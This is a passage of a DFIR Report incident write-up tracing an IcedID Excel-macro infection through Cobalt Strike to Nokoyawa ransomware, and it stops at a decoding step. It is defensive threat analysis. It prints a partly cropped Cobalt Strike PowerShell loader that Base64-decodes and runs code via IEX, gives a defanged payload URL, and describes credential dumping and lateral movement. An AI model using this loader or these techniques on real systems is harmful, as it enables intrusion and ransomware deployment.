<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-18546" class="post-18546 post type-post status-publish format-standard hentry category-adfind category-cobaltstrike category-icedid category-macro category-nokoyawa category-ransomware category-xls entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-67" href="https://thedfirreport.com/category/icedid/">icedid</a>
<a class="category-color-113" href="https://thedfirreport.com/category/macro/">macro</a>
<a class="category-color-111" href="https://thedfirreport.com/category/nokoyawa/">nokoyawa</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
<a class="category-color-112" href="https://thedfirreport.com/category/xls/">xls</a>
</span>
</div>
<h1 class="entry-title">IcedID Macro Ends in Nokoyawa Ransomware</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2023-05-22T01:04:22+00:00">May 22, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>Threat actors have moved to other means of initial access, such as ISO files combined with LNKs or OneNote payloads, but some appearances of VBA macros in Office documents can still be seen in use.</p>
<p>In this case we document an incident taking place during Q4 of 2022 consisting of threat actors targeting <a href="https://twitter.com/reecdeep/status/1577979717717721088?s=20&amp;t=QWDIpjACeLzPOEy4DDGnUQ" target="_blank" rel="noreferrer noopener">Italian</a> organizations with Excel maldocs that deploy IcedID. The threat actors deploying such a campaign may hope to target organizations who have not updated their Microsoft Office deployments after the newly released patches to <a href="https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked" target="_blank" rel="noreferrer noopener">block macros on documents downloaded from the internet</a>.</p>
<p>We have <a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" target="_blank" rel="noreferrer noopener">previously</a> <a href="https://thedfirreport.com/2022/04/25/quantum-ransomware/" target="_blank" rel="noreferrer noopener">reported </a>on IcedID intrusions that have migrated to ISO files, however, this report is one of the most recent that will focus on the traditional Excel/macro intrusion vector.</p>
<p>Once inside, the threat actors pivoted using Cobalt Strike and RDP before a domain wide deployment of Nokoyawa ransomware with the help of PsExec. Nokowaya ransomware is a family with ties to <a href="https://www.sentinelone.com/labs/nokoyawa-ransomware-new-karma-nemty-variant-wears-thin-disguise/" target="_blank" rel="noreferrer noopener">Karma</a>/<a href="https://www.fortinet.com/blog/threat-research/nokoyawa-variant-catching-up" target="_blank" rel="noreferrer noopener">Nemty</a>.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/#services">The DFIR Report Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noreferrer noopener">Private Threat Briefs</a>:</strong> Over 20 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noreferrer noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noreferrer noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noreferrer noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p><a href="https://thedfirreport.com/contact/" target="_blank" rel="noreferrer noopener">Contact us</a> today for a demo!</p>
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<p>This intrusion began with a malicious Excel document. We assess with medium-high confidence that this document was delivered as part of a malicious email campaign during the first half of October 2022, based on public reporting that overlaps with multiple characteristics observed. Upon opening the Excel document, the macros would be executed when a user clicked on an embedded image. The macro code was responsible for downloading and writing an IcedID DLL payload to disk. The macro then used a renamed rundll32 binary to execute the malicious DLL.</p>
<p>After reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after execution. This discovery used the same suite of Microsoft binaries as we have <a href="https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/" target="_blank" rel="noreferrer noopener">previously</a> <a href="https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/" target="_blank" rel="noreferrer noopener">reported</a> for the IcedID malware family. At this time, the malware also established persistence on the beachhead host using a scheduled task.</p>
<p>Around two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead. Within minutes of running Cobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons. Following this activity, the threat actors conducted further reconnaissance, and then moved laterally to a Domain Controller through the execution of a Cobalt Strike payload via WMI.</p>
<p>Next, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with an interest in password files. The threat actors appeared to have removed some contents of the network shares off the network as canary files report the documents being opened off network minutes later. After this, the threat actors remained quiet over the next several days.</p>
<p>On the fourth day, the threat actors returned briefly to execute a few commands on the Domain Controller related to the enumeration of domain computers and high privilege user account groups. Privilege escalation was also observed on the system via named pipe impersonation.</p>
<p>Early on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a file from dropmefiles[.]com. But after completing this, they went silent again for around another eight hours. Then, from the beachhead host, a new process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and AdFind.</p>
<p>The threat actors then began to spread laterally using a combination of Cobalt Strike beacon DLLs, batch scripts, and WMI commands. More credential dumping was observed, followed by additional AdFind and other Windows discovery commands. The threat actors then continued lateral movement and began checking RDP access across the environment. A batch file was run enumerating hostnames throughout the environment using nslookup. Some further pivoting around systems and targeted discovery continued throughout the rest of the day.</p>
<p>On the seventh day, around 23 hours since the last activity in the environment the threat actors began the final phase of the intrusion. The threat actors connected to a compromised server via RDP. From this server they would stage the ransomware deployment. They deployed the ransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat. Opening a command prompt, they moved through executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts. They then used the batch scripts to execute the ransomware payload via PsExec and WMI.</p>
<p>The time to ransomware (TTR) was around 148 hours (~6 days) from the initial infection. After the intrusion, contact was made with the threat actors using their support site and the price of the ransom was quoted around $200,000 USD in Bitcoin. No ransom was paid as a result of this intrusion.</p>
<h2 id="analysts" class="wp-block-heading"><a href="#analysts">Analysts</a></h2>
<p>Analysis and reporting completed by <a href="https://twitter.com/iiamaleks" target="_blank" rel="noreferrer noopener">@iiamaleks</a>, <a href="https://twitter.com/MittenSec" target="_blank" rel="noreferrer noopener">@MittenSec</a>, &amp; <a href="https://twitter.com/0xtornado" target="_blank" rel="noreferrer noopener">@0xtornado</a>.</p>
<h2 class="wp-block-heading">MITRE ATT&amp;CK</h2>
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<p>This intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in the maldoc template and the IcedID C2 server.</p>
<figure class="wp-block-embed is-type-rich is-provider-twitter wp-block-embed-twitter">
<div class="wp-block-embed__wrapper" style="text-align: center;"><a href="https://twitter.com/reecdeep/status/1577979717717721088?s=20&amp;t=QWDIpjACeLzPOEy4DDGnUQ">https://twitter.com/reecdeep/status/1577979717717721088?s=20&amp;t=QWDIpjACeLzPOEy4DDGnUQ</a></div>
</figure>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-18551" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-001.png" alt width="911" height="1200" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-001.png 911w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-001-228x300.png 228w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-001-777x1024.png 777w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-001-768x1012.png 768w" sizes="(max-width: 911px) 100vw, 911px" /></a></figure>
<p>&nbsp;</p>
<p>This case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images embedded in the document, which caused the macros to execute when a user clicks on either of the images:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-002.png"><img decoding="async" class="aligncenter size-full wp-image-18552" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-002.png" alt width="1069" height="1200" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-002.png 1069w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-002-267x300.png 267w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-002-912x1024.png 912w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-002-768x862.png 768w" sizes="(max-width: 1069px) 100vw, 1069px" /></a></p>
<p>The macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload. More on this in the next section.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-003.png"><img decoding="async" class="aligncenter size-full wp-image-18553" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-003.png" alt width="1600" height="283" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-003.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-003-300x53.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-003-1024x181.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-003-768x136.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-003-1536x272.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>
<p>&nbsp;</p>
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<h3 class="wp-block-heading">IcedID</h3>
<p>Once the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18554" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-004.png" alt width="1600" height="144" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-004.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-004-300x27.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-004-1024x92.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-004-768x69.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-004-1536x138.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>When the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:</p>
<ul class="wp-block-list">
<li>Two OPTIONS requests followed by a GET request.</li>
<li>User-agent fields mentioning Microsoft Office.</li>
<li>Specific HTTP headers such as <code>X-Office-Major-Version</code> , <code>X-MSGETWEBURL</code> , <code>X-IDCRL_ACCEPTED</code> , and <code>UA-CPU</code>.</li>
</ul>
<figure><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18555" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-005.png" alt width="1325" height="175" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-005.png 1325w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-005-300x40.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-005-1024x135.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-005-768x101.png 768w" sizes="(max-width: 1325px) 100vw, 1325px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18556" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-006.png" alt width="1600" height="518" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-006.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-006-300x97.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-006-1024x332.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-006-768x249.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-006-1536x497.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>
<figure class="wp-block-image"></figure>
<p>Once the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk. In this case, the payload was written to the path retrieved from <code>Application.DefaultFilePath</code>, which is the default path used by Excel when it opens files.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18557" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-007.png" alt width="1600" height="565" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-007.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-007-300x106.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-007-1024x362.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-007-768x271.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-007-1536x542.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>The random name generated for the IcedID payload may be either 1 to 7 random digits, or <code>4500</code>. This is because the <code>Rnd</code> function will return &#8220;<a href="https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/rnd-function" target="_blank" rel="noreferrer noopener">a value less than 1 but greater than or equal to zero</a>&#8220;.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18558" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-008.png" alt width="1600" height="617" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-008.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-008-300x116.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-008-1024x395.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-008-768x296.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-008-1536x592.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>Once the IcedID payload is successfully written to disk, the following post deployment steps are initiated:</p>
<ul class="wp-block-list">
<li>Rundll32.exe is copied into a file named calc.exe under the path returned by <code>Application.DefaultFilePath </code>.</li>
<li>Calc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.</li>
</ul>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18559" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-009.png" alt width="1600" height="723" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-009.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-009-300x136.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-009-1024x463.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-009-768x347.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-009-1536x694.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>In this case, rundll32.exe was copied into the user Documents folder and named calc.exe. The name &#8216;calc.exe&#8217; is hard-coded into the VBA code and will not be changed.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18560" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-010.png" alt width="1600" height="613" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-010.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-010-300x115.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-010-1024x392.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-010-768x294.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-010-1536x588.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></p>
<p>Once the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18561" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-011.png" alt width="1600" height="69" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-011.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-011-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-011-1024x44.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-011-768x33.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-011-1536x66.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>
<p>The following diagram provides a visual summary of the process to execute IcedID on the endpoint.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-056.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18562" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-056.png" alt width="4084" height="1048" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-056.png 4084w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-056-300x77.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-056-1024x263.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-056-768x197.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-056-1536x394.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-056-2048x526.png 2048w" sizes="(max-width: 4084px) 100vw, 4084px" /></a></figure>
<p>&nbsp;</p>
<h3 class="wp-block-heading">IcedID VNC</h3>
<p>The threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18563" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-013.png" alt width="3451" height="170" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-013.png 3451w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-013-300x15.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-013-1024x50.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-013-768x38.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-013-1536x76.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-013-2048x101.png 2048w" sizes="(max-width: 3451px) 100vw, 3451px" /></a>We were able to reconstruct some of the VNC traffic thanks to <a href="https://twitter.com/0xThiebaut" target="_blank" rel="noopener">@0xThiebaut</a>&#8216;s tool <a href="https://github.com/0xThiebaut/PCAPeek/" target="_blank" rel="noopener">PCAPeek</a>. You can see the below options such as Edge, Chrome, Firefox, CMD, Task Manager and run dialog. Based on the visual it appears to be the KeyHole VNC module <a href="https://blog.nviso.eu/2023/03/20/icedids-vnc-backdoors-dark-cat-anubis-keyhole/">reported first observed</a> in Oct 2022 by NVISO.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-057.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18622" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-057.png" alt width="1194" height="415" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-057.png 1194w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-057-300x104.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-057-1024x356.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-057-768x267.png 768w" sizes="(max-width: 1194px) 100vw, 1194px" /></a></p>
<p>In another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier. More information can be found about this <a href="https://twitter.com/DanielStepanic/status/1647342498132393984" target="_blank" rel="noreferrer noopener">here</a>.</p>
<p>However, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.</p>
<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-18668" src="https://thedfirreport.com/wp-content/uploads/2023/05/Untitled.png" alt width="3786" height="261" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/Untitled.png 3786w, https://thedfirreport.com/wp-content/uploads/2023/05/Untitled-300x21.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/Untitled-1024x71.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/Untitled-768x53.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/Untitled-1536x106.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/Untitled-2048x141.png 2048w" sizes="(max-width: 3786px) 100vw, 3786px" /></figure>
<p>&nbsp;</p>
<p class="wp-block-heading">Several other programs were seen run in this manner, as seen in process execution logs below:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-059.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18623" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-059.png" alt width="1247" height="927" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-059.png 1247w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-059-300x223.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-059-1024x761.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-059-768x571.png 768w" sizes="(max-width: 1247px) 100vw, 1247px" /></a></p>
<h3 class="wp-block-heading">Cobalt Strike</h3>
<p>The threat actors used Cobalt Strike beacons throughout the intrusion. The first beacon was executed via PowerShell, which in turn was executed initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18565" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-015.png" alt width="2934" height="622" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-015.png 2934w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-015-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-015-1024x217.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-015-768x163.png 768w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-015-1536x326.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-015-2048x434.png 2048w" sizes="(max-width: 2934px) 100vw, 2934px" /></a></p>
<p>The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on <a href="https://www.virustotal.com/gui/url/913510daabfab8551b7da3780ad9010ef31384c4e4975681c7d845b816e29c6b" target="_blank" rel="noreferrer noopener">VirusTotal</a>. Here is the content of the payload, where we can observe an object being created in memory using an encoded string. We will walk through decoding this string to view the Cobalt Strike configuration present within.</p>
<pre class="wp-block-preformatted">$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAA/9y969OySLIv+nnmr+gPK6K7g16tIqLuiBVxEBUQES94wdkTE6DIRZA7ivvs//1kVqGP79tvz8yOFfvLeSIMH6GoS1ZefplVWWyc4j83ReafCi0+Oz/9587Jcj++/cT+9a+X8nYq8H/85x+uU/wjyeLTP6zzOXPy/Kf/9de/LK3Min765T8qK/tHFJ/L0PntJ/IDCzrnMnN+/ctf/voXcqm85dbF+cfNKvzK+UfkFF58zn/6r59++ZuQJOM4svzb3//H/xDLLHNuBf39u+QUQp47kR36Tv7Lrz/9vz/tPSdz/lO3A+dU/PS/fvqPf/wuhbFthU2xWrROHoxCuJ3x3jw+WTiC3zdJ6Be//Pw//
&lt;---CROPPED_BASE64_CODE---&gt;
/Pj8+Pz4/Pj8+Pz4/Pj8+Pz4/Pj83/580/ff/rpD9tj9u3nP96//cu32j9/o//+aX/59sfrKvstOG7CX62jOFzw75r2/du//fSHP1RFf/nj/a900T/yn9Z3aq7Z+ukPf6OmZdl1RbX+4hf5Jfz69ZVaS77CX8eHS5gdT36YXZMgzH91Vlker/Z//fOfh+HFDvdhtLqEg2M2EIfgkhwP3jHBFT//vKV/+C0KL7+dsmPw22qzycI8/7YLs0O4bzZ+3ez3396S7CJW++5+fwy+//Lt90s2Zbu/XYpT+O1ff/4LjcK7ZH/95dtfFvS/zcZ/+H/fv1UVv3//Xt7UWmy3YaZu/7qiG7oed2FV889//qT7++XvJnIWHqJL/Mu32r1Zq9XwX1aj1v7rE2MdT8XPVXvUQNn6cyh/39VedvVdLUAmDl/hf+Ma/EOv//nsYv7ejsnm72ZPjug/nrLvP/3tp38HMzzV9OtbBQA="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
</pre>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18566" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-016.png" alt width="1477" height="1200" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-016.png 1477w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-016-300x244.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-016-1024x832.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-016-768x624.png 768w" sizes="(max-width: 1477px) 100vw, 1477px" /></a></p>
<p>After initial Base64 decoding, we found the payload used the <a href="https://decoded.avast.io/threatintel/decoding-cobalt-strike-understanding-payloads/" target="_blank" rel="noreferrer noopener">default Cobalt Strike XOR value of 35</a> which allows for the next step of decoding the payload.</p>
<p>Second stage decoding:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/05/18190-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-18567" src="https://thedfirreport.com/wp-content/uploads/2023/05/18190-017.png" alt width="1476" height="1200" srcset="https://thedfirreport.com/wp-content/uploads/2023/05/18190-017.png 1476w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-017-300x244.png 300w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-017-1024x833.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/05/18190-017-768x624.png 768w" sizes="(max-width: 1476px) 100vw, 1476px" /></a></p>
